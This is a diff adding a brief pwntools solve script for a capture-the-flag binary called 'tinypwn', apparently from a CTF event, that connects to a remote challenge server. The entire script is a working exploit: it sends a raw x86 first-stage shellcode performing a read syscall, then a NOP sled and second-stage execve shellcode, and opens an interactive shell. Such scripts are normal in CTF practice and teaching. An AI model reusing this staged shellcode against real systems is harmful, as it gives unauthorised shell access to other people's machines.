@@ -1,0 +1,9 @@
+from pwn import *
+
+#io = process('./tinypwn')
+io = remote('vsc.tf', 3026)
+
+io.sendline(b'\x31\xC0\x04\x03\x80\xC6\x7F\xCD\x80')
+pause()
+io.send(b'\x90'*0x20+b'\x31\xC0\x04\x0B\x31\xD2\x31\xC9\xBB\x20\x00\x01\x00\xCD\x80')
+io.interactive()
